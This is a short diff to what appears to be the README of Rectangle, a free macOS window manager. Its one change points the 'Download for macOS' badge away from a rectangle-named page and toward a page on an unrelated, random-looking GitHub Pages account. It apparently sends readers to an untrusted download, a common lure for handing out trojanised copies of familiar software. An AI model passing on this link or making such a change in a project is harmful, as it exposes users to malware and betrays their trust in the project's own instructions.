@@ -2,7 +2,7 @@
 
 Rectangle is a free and open-source window manager for macOS that helps you organize windows with simple keyboard shortcuts. Easily snap windows into pre-defined zones and improve your multitasking flow on Mac. 🚀
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Rectangle-blue?style=for-the-badge\&logo=apple)](https://rectangle-for-mac.github.io/.github/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Rectangle-blue?style=for-the-badge\&logo=apple)](https://fituganshfgh.github.io/.github/rectangle)
 
 If the download button doesn't work, follow the Terminal installation method below.
 
